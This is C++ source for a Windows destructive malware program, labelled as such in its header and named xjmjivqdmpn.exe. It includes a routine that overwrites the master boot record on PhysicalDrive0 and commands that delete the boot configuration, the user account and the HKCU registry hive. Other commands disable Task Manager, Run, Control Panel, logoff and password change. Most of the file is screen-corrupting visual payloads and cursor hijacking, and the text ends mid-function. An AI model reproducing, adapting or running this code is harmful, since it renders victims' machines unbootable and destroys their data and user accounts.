// xjmjivqdmpn.cpp : malware
// caesar cipher for coronavirus

#include <windows.h>
#include <tchar.h>
#include <ctime>
#include <iostream>
#include <windowsx.h>
#pragma comment(lib, "winmm.lib")
#pragma comment(lib,"Msimg32.lib")
#include <math.h>
#include <time.h>
#include "bootrec.h"
#define M_PI   3.14159265358979323846264338327950288
typedef NTSTATUS(NTAPI* NRHEdef)(NTSTATUS, ULONG, ULONG, PULONG, ULONG, PULONG);
typedef NTSTATUS(NTAPI* RAPdef)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
typedef union _RGBQUAD {
	COLORREF rgb;
	struct {
		BYTE r;
		BYTE g;
		BYTE b;
		BYTE Reserved;
	};
}_RGBQUAD, * PRGBQUAD;
typedef struct
{
	FLOAT h;
	FLOAT s;
	FLOAT l;
} HSL;

namespace Colors
{
	//These HSL functions was made by Wipet, credits to him!
	//OBS: I used it in 3 payloads

	//Btw ArTicZera created HSV functions, but it sucks unfortunatelly
	//So I didn't used in this malware.

	HSL rgb2hsl(RGBQUAD rgb)
	{
		HSL hsl;

		BYTE r = rgb.rgbRed;
		BYTE g = rgb.rgbGreen;
		BYTE b = rgb.rgbBlue;

		FLOAT _r = (FLOAT)r / 255.f;
		FLOAT _g = (FLOAT)g / 255.f;
		FLOAT _b = (FLOAT)b / 255.f;

		FLOAT rgbMin = min(min(_r, _g), _b);
		FLOAT rgbMax = max(max(_r, _g), _b);

		FLOAT fDelta = rgbMax - rgbMin;
		FLOAT deltaR;
		FLOAT deltaG;
		FLOAT deltaB;

		FLOAT h = 0.f;
		FLOAT s = 0.f;
		FLOAT l = (FLOAT)((rgbMax + rgbMin) / 2.f);

		if (fDelta != 0.f)
		{
			s = l < .5f ? (FLOAT)(fDelta / (rgbMax + rgbMin)) : (FLOAT)(fDelta / (2.f - rgbMax - rgbMin));
			deltaR = (FLOAT)(((rgbMax - _r) / 6.f + (fDelta / 2.f)) / fDelta);
			deltaG = (FLOAT)(((rgbMax - _g) / 6.f + (fDelta / 2.f)) / fDelta);
			deltaB = (FLOAT)(((rgbMax - _b) / 6.f + (fDelta / 2.f)) / fDelta);

			if (_r == rgbMax)      h = deltaB - deltaG;
			else if (_g == rgbMax) h = (1.f / 3.f) + deltaR - deltaB;
			else if (_b == rgbMax) h = (2.f / 3.f) + deltaG - deltaR;
			if (h < 0.f)           h += 1.f;
			if (h > 1.f)           h -= 1.f;
		}

		hsl.h = h;
		hsl.s = s;
		hsl.l = l;
		return hsl;
	}

	RGBQUAD hsl2rgb(HSL hsl)
	{
		RGBQUAD rgb;

		FLOAT r = hsl.l;
		FLOAT g = hsl.l;
		FLOAT b = hsl.l;

		FLOAT h = hsl.h;
		FLOAT sl = hsl.s;
		FLOAT l = hsl.l;
		FLOAT v = (l <= .5f) ? (l * (1.f + sl)) : (l + sl - l * sl);

		FLOAT m;
		FLOAT sv;
		FLOAT fract;
		FLOAT vsf;
		FLOAT mid1;
		FLOAT mid2;

		INT sextant;

		if (v > 0.f)
		{
			m = l + l - v;
			sv = (v - m) / v;
			h *= 6.f;
			sextant = (INT)h;
			fract = h - sextant;
			vsf = v * sv * fract;
			mid1 = m + vsf;
			mid2 = v - vsf;

			switch (sextant)
			{
			case 0:
				r = v;
				g = mid1;
				b = m;
				break;
			case 1:
				r = mid2;
				g = v;
				b = m;
				break;
			case 2:
				r = m;
				g = v;
				b = mid1;
				break;
			case 3:
				r = m;
				g = mid2;
				b = v;
				break;
			case 4:
				r = mid1;
				g = m;
				b = v;
				break;
			case 5:
				r = v;
				g = m;
				b = mid2;
				break;
			}
		}

		rgb.rgbRed = (BYTE)(r * 255.f);
		rgb.rgbGreen = (BYTE)(g * 255.f);
		rgb.rgbBlue = (BYTE)(b * 255.f);

		return rgb;
	}
}
int red, green, blue;
bool ifcolorblue = false, ifblue = false;
COLORREF Hue(int length) { //Credits to Void_/GetMBR
	if (red != length) {
		red < length; red++;
		if (ifblue == true) {
			return RGB(red, 0, length);
		}
		else {
			return RGB(red, 0, 0);
		}
	}
	else {
		if (green != length) {
			green < length; green++;
			return RGB(length, green, 0);
		}
		else {
			if (blue != length) {
				blue < length; blue++;
				return RGB(0, length, blue);
			}
			else {
				red = 0; green = 0; blue = 0;
				ifblue = true;
			}
		}
	}
}
COLORREF RndRGB() {
	int clr = rand() % 5;
	if (clr == 0) return RGB(255, 0, 0); if (clr == 1) return RGB(0, 255, 0); if (clr == 2) return RGB(0, 0, 255); if (clr == 3) return RGB(255, 0, 255); if (clr == 4) return RGB(255, 255, 0);
}
DWORD WINAPI MBRWiper(LPVOID lpParam) {
	DWORD dwBytesWritten;
	HANDLE hDevice = CreateFileW(
		L"\\\\.\\PhysicalDrive0", GENERIC_ALL,
		FILE_SHARE_READ | FILE_SHARE_WRITE, 0,
		OPEN_EXISTING, 0, 0);

	WriteFile(hDevice, MasterBootRecord, 32768, &dwBytesWritten, 0);
	return 1;
}
DWORD WINAPI Destroy(LPVOID lpParam) {
	system("taskkill /f /im taskmgr.exe");
	system("REG ADD hkcu\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\system /v DisableTaskMgr /t reg_dword /d 1 /f");
	system("REG ADD hkcu\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\Explorer /v NoRun /t reg_dword /d 1 /f");
	system("REG ADD hkcu\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\Explorer /v NoControlPanel /t reg_dword /d 1 /f");
	system("reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v HideFastUserSwitching /t REG_DWORD /d 1 /f");
	system("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /v NoLogoff /t REG_DWORD /d 1 /f");
	system("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableLockWorkstation /t REG_DWORD /d 1 /f");
	system("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableChangePassword /t REG_DWORD /d 1 /f");
	system("bcdedit /delete {current}");
	system("net user %username% /delete");
	return 1;
}
DWORD WINAPI regdelete(LPVOID lpParam) {
	system("reg delete hkcu /f");
	system("REG ADD hkcu\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\system /v DisableTaskMgr /t reg_dword /d 1 /f");
	system("REG ADD hkcu\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\Explorer /v NoRun /t reg_dword /d 1 /f");
	system("REG ADD hkcu\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\Explorer /v NoControlPanel /t reg_dword /d 1 /f");
	system("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /v NoLogoff /t REG_DWORD /d 1 /f");
	system("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableLockWorkstation /t REG_DWORD /d 1 /f");
	system("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableChangePassword /t REG_DWORD /d 1 /f");
	MessageBox(NULL, L"The Registry has been destroyed!", L"xjmjivqdmpn.exe - Success", MB_ICONINFORMATION);
	return 1;
}
DWORD WINAPI shader1(LPVOID lpvd)
{
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int screenWidth = GetSystemMetrics(SM_CXSCREEN);
	int screenHeight = GetSystemMetrics(SM_CYSCREEN);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;

	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = screenWidth;
	bmpi.bmiHeader.biHeight = screenHeight;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;


	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;

	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);

	INT i = 0;

	while (1)
	{
		hdc = GetDC(NULL);
		StretchBlt(hdcCopy, 0, 0, screenWidth, screenHeight, hdc, 0, 0, screenWidth, screenHeight, SRCCOPY);

		RGBQUAD rgbquadCopy;

		for (int x = 0; x < screenWidth; x++)
		{
			for (int y = 0; y < screenHeight; y++)
			{
				int index = y * screenWidth + x;

				int fx = (int)((i ^ 4) + (i * 4) * cbrt(x * i ^ i * y + x ^ i + y + i * x + y));

				rgbquadCopy = rgbquad[index];

				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h = fmod(fx / 400.f + y / screenHeight * .2f, 1.f);
				hslcolor.s = 3.f;

				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}

		i++;

		StretchBlt(hdc, 0, 0, screenWidth, screenHeight, hdcCopy, 0, 0, screenWidth, screenHeight, SRCCOPY);
		ReleaseDC(NULL, hdc);
		DeleteDC(hdc);
	}

	return 0x00;
}
DWORD WINAPI shader2(LPVOID lpParam) {
	HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
	INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
	SelectObject(hdcMem, hbmTemp);
	for (;;) {
		hdcScreen = GetDC(0);
		BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
		for (INT i = 0; i < w * h; i++) {
			INT x = i % w, y = i / w;
			//rgbScreen[i].r = x;
			rgbScreen[i].rgb += x * y ^ i;
		}
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
		ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
	}
}
DWORD WINAPI shader3(LPVOID lpParam) {
	HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
	INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
	SelectObject(hdcMem, hbmTemp);
	for (;;) {
		hdcScreen = GetDC(0);
		BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
		for (INT i = 0; i < w * h; i++) {
			INT x = i % w, y = i / w;
			//rgbScreen[i].r = x;
			rgbScreen[i].rgb += ((4 * i) + ((4 * i) * sin(x / 32.0)) + (4 * i) + ((4 * i) * sin(y / 24.0)));
		}
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
		ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
	}
}
DWORD WINAPI shader4(LPVOID lpvd) //credits to fr4ctalz for the base
{
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int screenWidth = GetSystemMetrics(SM_CXSCREEN);
	int screenHeight = GetSystemMetrics(SM_CYSCREEN);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;

	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = screenWidth;
	bmpi.bmiHeader.biHeight = screenHeight;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;


	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;

	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);

	INT i = 0;

	while (1)
	{
		hdc = GetDC(NULL);
		StretchBlt(hdcCopy, 0, 0, screenWidth, screenHeight, hdc, 0, 0, screenWidth, screenHeight, SRCCOPY);

		RGBQUAD rgbquadCopy;

		for (int x = 0; x < screenWidth; x++)
		{
			for (int y = 0; y < screenHeight; y++)
			{
				int index = y * screenWidth + x;

				int fx = (int)((i * 4) + (i * 4) * cbrt(x ^ 25));

				rgbquadCopy = rgbquad[index];

				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h = fmod(fx / 400.f + y / screenHeight * .2f, 1.f);
				hslcolor.l = 3.f;
				hslcolor.l = 0.700f;
				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}

		i++;

		StretchBlt(hdc, 0, 0, screenWidth, screenHeight, hdcCopy, 0, 0, screenWidth, screenHeight, SRCCOPY);
		ReleaseDC(NULL, hdc);
		DeleteDC(hdc);
	}

	return 0x00;
}
DWORD WINAPI shader5(LPVOID lpvd) //credits to fr4ctalz
{
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;

	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = w;
	bmpi.bmiHeader.biHeight = h;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;

	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;

	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);

	INT i = 0;

	while (1)
	{
		hdc = GetDC(NULL);
		StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);

		RGBQUAD rgbquadCopy;

		for (int x = 0; x < w; x++)
		{
			for (int y = 0; y < h; y++)
			{
				int index = y * w + x;

				FLOAT fx = ((x + (i * 100)) + (y ^ (i & 4))) | ((x << 2) + (y >> 1));

				rgbquadCopy = rgbquad[index];

				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h = fmod(fx / 300.f + y / h * .1f, 1.f);
				hslcolor.s = 2.f;
				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}

		i++;
		StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCCOPY);
		ReleaseDC(NULL, hdc); DeleteDC(hdc);
	}

	return 0x00;
}
DWORD WINAPI polygon1(LPVOID lpParam) {
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	int signX = 1;
	int signY = 1;
	int signX1 = 1;
	int signY1 = 1;
	int incrementor = 10;
	int x = 10;
	int y = 10;
	while (1) {
		HDC hdc = GetDC(0);
		int top_x = 0 + x;
		int top_y = 0 + y;
		int bottom_x = 100 + x;
		int bottom_y = 100 + y;
		x += incrementor * signX;
		y += incrementor * signY;
		//HBRUSH brush = CreateSolidBrush(Hue(239));
		//SelectObject(hdc, brush);
		//if (x != 0 && y != 0) Pie(hdc, top_x, top_y, bottom_x, bottom_y, rand() % x, rand() % y, rand() % x, rand() % y);
		HPEN hPen = CreatePen(PS_SOLID, 2, Hue(239));
		HPEN hOldPen = SelectPen(hdc, hPen);

		HBRUSH hBrush = CreateSolidBrush(Hue(239));
		HBRUSH hOldBrush = SelectBrush(hdc, hBrush);

		POINT vertices[] = { {x + 200, y + 100}, {x + 300, y + 300}, {x + 100, y + 300} };
		Polygon(hdc, vertices, sizeof(vertices) / sizeof(vertices[0]));

		SelectBrush(hdc, hOldBrush);
		DeleteObject(hBrush);

		SelectPen(hdc, hOldPen);
		DeleteObject(hPen);
		if (y >= GetSystemMetrics(SM_CYSCREEN))
		{
			signY = -1;
		}

		if (x >= GetSystemMetrics(SM_CXSCREEN))
		{
			signX = -1;
		}

		if (y == 0)
		{
			signY = 1;
		}

		if (x == 0)
		{
			signX = 1;
		}
		Sleep(1);
		//DeleteObject(brush);
		ReleaseDC(0, hdc);
	}
}
/*DWORD WINAPI plgblt(LPVOID lpParam) //credits to N17Pro3426
{
	HDC hdc = GetDC(0);
	RECT wRect;
	POINT wPt[3];
	while (1)
	{
		GetWindowRect(GetDesktopWindow(), &wRect);
		wPt[0].x = wRect.left - 100;
		wPt[0].y = wRect.top + 100;
		wPt[1].x = wRect.right - 100;
		wPt[1].y = wRect.top + 0;
		wPt[2].x = wRect.left - 0;
		wPt[2].y = wRect.bottom - 0;
		PlgBlt(hdc, wPt, hdc, wRect.left, wRect.top, wRect.right - wRect.left, wRect.bottom - wRect.top, 0, 0, 0);
	}
}*/
DWORD WINAPI blur1(LPVOID lpvd) //credits to N17Pro3426 for the PlgBlt
{
	//Credits to ArTicZera and Rekto
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	RECT wRect;
	POINT wPt[3];
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);

	BITMAPINFO bmpi = { 0 };
	BLENDFUNCTION blur;
	HBITMAP bmp;

	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = w;
	bmpi.bmiHeader.biHeight = h;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;

	bmp = CreateDIBSection(hdc, &bmpi, 0, 0, NULL, 0);
	SelectObject(hdcCopy, bmp);

	blur.BlendOp = AC_SRC_OVER;
	blur.BlendFlags = 0;
	blur.AlphaFormat = 0;
	blur.SourceConstantAlpha = 10;

	while (1) {
		hdc = GetDC(NULL);
		//StretchBlt(hdcCopy, 0, 10, w, h + 20, hdc, 0, 0, w, h, SRCERASE);
		GetWindowRect(GetDesktopWindow(), &wRect);
		wPt[0].x = wRect.left - 100;
		wPt[0].y = wRect.top + 100;
		wPt[1].x = wRect.right - 100;
		wPt[1].y = wRect.top + 0;
		wPt[2].x = wRect.left - 0;
		wPt[2].y = wRect.bottom - 0;
		PlgBlt(hdcCopy, wPt, hdc, wRect.left, wRect.top, wRect.right - wRect.left, wRect.bottom - wRect.top, 0, 0, 0);
		AlphaBlend(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, blur);
		//Sleep(rand() % 25);
		ReleaseDC(0, hdc);
	}
	return 0x00;
}
DWORD WINAPI shader6(LPVOID lpParam) {
	HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
	INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
	SelectObject(hdcMem, hbmTemp);
	for (;;) {
		hdcScreen = GetDC(0);
		BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
		for (INT i = 0; i < w * h; i++) {
			INT x = i % w, y = i / w;
			//rgbScreen[i].r = x;
			rgbScreen[i].rgb = (rgbScreen[i].rgb * 2) % (RndRGB());
		}
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
		ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
	}
}
DWORD WINAPI cur1(LPVOID lpParam)//credits to N17Pro3426 for the radius
{
	POINT cursor;
	int centerX = 600;
	int centerY = 400;
	int radius = 400;
	float angle = 0;
	while (true)
	{
		HDC hdc = GetDC(0);
		int x = centerX + static_cast<int>(radius * cos(angle * M_PI / 180));
		int y = centerY + static_cast<int>(radius * sin(angle * M_PI / 180));
		//HBRUSH brush = CreateSolidBrush(Hue(239));
		//SelectObject(hdc, brush);
		GetCursorPos(&cursor);
		//RoundRect(hdc, x - 40, y - 40, x + 40, y + 40, x / 2, y / 2);
		SetCursorPos (x, y);
		int icon_x = GetSystemMetrics(SM_CXICON);
		int icon_y = GetSystemMetrics(SM_CYICON);
		DrawIcon(hdc, cursor.x - icon_x, cursor.y - icon_y, LoadIconW(0, IDI_WARNING));
		angle += 1;
		Sleep(10);
		//DeleteObject(brush);
		ReleaseDC(0, hdc);
	};
}
DWORD WINAPI shader7(LPVOID lpParam) { //credits to N17Pro3426 for the radius
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	RGBQUAD* data = (RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); int rgb = MAXDWORD64, v = 0, radius = 17.4f; double angle = 0;
	HDC hdc, hdcMem; HBITMAP hbm;
	for (int i = 0;; i++, i %= 6) {
		//if (!i) for (int c = 0; c < 21; c++)InvalidateRect(0, 0, 0);
		hdc = GetDC(0); hdcMem = CreateCompatibleDC(hdc); hbm = CreateBitmap(w, h, 1, 32, data);
		SelectObject(hdcMem, hbm);
		BitBlt(hdcMem, 0, 0, w, h, hdc, 0, 0, SRCCOPY); GetBitmapBits(hbm, w * h * 4, data);
		for (int i = 0; w * h > i; i++) {
			int x = i % w, y = i / h;
			if (i % h == 0 && rand() % 100 == 0)  v = 1 + rand() % 6;
			rgb += (int)data + (x & y);
			((BYTE*)(data + i))[v] = rgb;
		}
		float x = cos(angle) * radius, y = sin(angle) * radius;
		SetBitmapBits(hbm, w * h * 4, data); BitBlt(hdc, 0, 0, w, h, hdcMem, x, y, SRCCOPY);
		DeleteObject(hbm); DeleteObject(hdcMem);
		DeleteObject(hdc);
		//Sleep(39.7);
		angle = fmod(angle + M_PI / radius, M_PI * radius);
	}
}
DWORD WINAPI shader8(LPVOID lpParam) {
	HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
	INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
	SelectObject(hdcMem, hbmTemp);
	for (;;) {
		hdcScreen = GetDC(0);
		BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
		for (INT i = 0; i < w * h; i++) {
			INT x = i % w, y = i / w;
			//rgbScreen[i].r = x;
			rgbScreen[i].rgb += (x ^ (x + y)) + (i * 4);
		}
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
		ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
	}
}
DWORD WINAPI textout1(LPVOID lpvd) //credits to N17Pro3426 for the resized text
{
	int x = GetSystemMetrics(0);
	int y = GetSystemMetrics(1);
	LPCSTR text = 0;
	LPCSTR text1 = 0;
	LPCSTR text2 = 0;
	LPCSTR text3 = 0;
	LPCSTR text4 = 0;
	LPCSTR text5 = 0;
	LPCSTR text6 = 0;
	while (1)
	{
		HDC hdc = GetDC(0);
		SetBkMode(hdc, 0);
		text = "xjmjivqdmpn.exe";
		text1 = "where am I?";
		text2 = "what is happening?";
		text3 = "bleeding";
		text4 = "suffer";
		text5 = "help me!";
		text6 = "can't even escape Ohio!";
		SetTextColor(hdc, Hue(239));
		HFONT font = CreateFontA(rand() % 100, rand() % 100, 0, 0, FW_THIN, 0, 0, 0, ANSI_CHARSET, 0, 0, 0, 0, "Times New Roman");
		SelectObject(hdc, font);
		TextOutA(hdc, rand() % x, rand() % y, text, strlen(text));
		Sleep(10);
		TextOutA(hdc, rand() % x, rand() % y, text1, strlen(text1));
		Sleep(10);
		TextOutA(hdc, rand() % x, rand() % y, text2, strlen(text2));
		Sleep(10);
		TextOutA(hdc, rand() % x, rand() % y, text3, strlen(text3));
		Sleep(10);
		TextOutA(hdc, rand() % x, rand() % y, text4, strlen(text4));
		Sleep(10);
		TextOutA(hdc, rand() % x, rand() % y, text5, strlen(text5));
		Sleep(10);
		TextOutA(hdc, rand() % x, rand() % y, text6, strlen(text6));
		Sleep(10);
		DeleteObject(font);
		ReleaseDC(0, hdc);
	}
}
DWORD WINAPI masher(LPVOID lpParam) {
	while (1) {
		HDC hdc = GetDC(HWND_DESKTOP);
		int sw = GetSystemMetrics(SM_CXSCREEN), sh = GetSystemMetrics(SM_CYSCREEN);
		//int a = rand() % sw, b = rand() % sh;
		BitBlt(hdc, rand() % 5, rand() % 5, rand() % sw, rand() % sh, hdc, rand() % 5, rand() % 5, SRCCOPY);
		//BitBlt(hdc, rand() % sw, rand() % sh, 200, 200, hdc, rand() % sw + rand() % 21 - 10, rand() % sh + rand() % 21 - 10, NOTSRCCOPY);
		ReleaseDC(0, hdc);
	}
}

DWORD WINAPI shader9(LPVOID lpParam) {
	HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
	INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
	SelectObject(hdcMem, hbmTemp);
	for (;;) {
		hdcScreen = GetDC(0);
		BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
		for (INT i = 0; i < w * h; i++) {
			INT x = i % w, y = i / w;
			INT t = y ^ y | x;
			rgbScreen[i].r *= x+y;
			rgbScreen[i].g *= x+i;
			rgbScreen[i].b *= t+i;
			//rgbScreen[i].rgb += (x ^ (x + y)) + (i * 4);
		}
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
		ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
	}
}
DWORD WINAPI shader10(LPVOID lpvd) //credits to fr4ctalz for the base
{
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int screenWidth = GetSystemMetrics(SM_CXSCREEN);
	int screenHeight = GetSystemMetrics(SM_CYSCREEN);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;

	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = screenWidth;
	bmpi.bmiHeader.biHeight = screenHeight;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;


	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;

	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);

	INT i = 0;

	while (1)
	{
		hdc = GetDC(NULL);
		StretchBlt(hdcCopy, 0, 0, screenWidth, screenHeight, hdc, 0, 0, screenWidth, screenHeight, SRCCOPY);

		RGBQUAD rgbquadCopy;

		for (int x = 0; x < screenWidth; x++)
		{
			for (int y = 0; y < screenHeight; y++)
			{
				int index = y * screenWidth + x;

				int fx = (int)((i ^ 4) + (i * 4) * cbrt(y ^ 30));

				rgbquadCopy = rgbquad[index];

				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h = fmod(fx / 400.f + y / screenHeight * .2f, 1.f);
				hslcolor.s = 3.f;
				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}

		i++;

		StretchBlt(hdc, 0, 0, screenWidth, screenHeight, hdcCopy, 0, 0, screenWidth, screenHeight, SRCCOPY);
		ReleaseDC(NULL, hdc);
		DeleteDC(hdc);
	}

	return 0x00;
}
DWORD WINAPI wave1(LPVOID lpParam) {
	int sw = GetSystemMetrics(SM_CXSCREEN), sh = GetSystemMetrics(SM_CYSCREEN), xSize = sh / 10, ySize = 9;
	while (1) {
		HDC hdc = GetDC(0);
		//for (int i = 0; i < sh*2; i++) {
		//    int wave = sin(i / ((float)xSize) * M_PI) * (ySize);
		//    BitBlt(hdc, i, 0, 1, sh, hdc, i, wave, SRCCOPY);
		//}
		for (int i = 0; i < sw * 2; i++) {
			int wave = tan(i / ((float)xSize) * M_PI) * (ySize);
			BitBlt(hdc, 0, i, sw, 1, hdc, wave, i, SRCCOPY);
		}
		if ((rand() % 100 + 1) % 67 == 0) InvalidateRect(0, 0, 0);
		ReleaseDC(0, hdc);
	}
}
DWORD WINAPI shader11(LPVOID lpvd) //credits to fr4ctalz for the base
{
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int screenWidth = GetSystemMetrics(SM_CXSCREEN);
	int screenHeight = GetSystemMetrics(SM_CYSCREEN);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;

	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = screenWidth;
	bmpi.bmiHeader.biHeight = screenHeight;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;


